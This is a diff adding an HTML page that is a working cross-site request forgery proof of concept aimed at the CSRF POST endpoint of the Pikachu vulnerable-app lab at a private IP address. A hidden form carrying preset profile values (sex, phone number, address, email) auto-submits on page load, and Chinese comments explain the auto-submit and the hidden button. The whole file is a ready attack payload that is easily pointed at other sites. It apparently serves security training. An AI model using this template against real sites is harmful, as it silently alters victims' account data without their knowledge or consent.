@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<!-- 这个script是用来自动提交表单的 -->
+<script>                                         
+    window.onload = function() {
+    document.getElementById("submit").click();
+    }
+</script>              
+<body>
+        <form action="http://192.168.177.136/pikachu-master/vul/csrf/csrfpost/csrf_post_login.php" method="POST">    
+            <input type="hidden" name="sex" value="girl" />
+            <input type="hidden" name="phonenum" value="12345678922" />
+            <input type="hidden" name="add" value="usa" />
+            <input type="hidden" name="email" value="xiannv@pikachu.com" />
+            <input type="hidden" name="submit" value="submit" />
+            <input id="submit" type="submit" value="Submit request" style="display:none"/>           <!-- style设置为display:none起到隐藏submit按钮的作用 -->
+        </form>
+</body>
+</html>
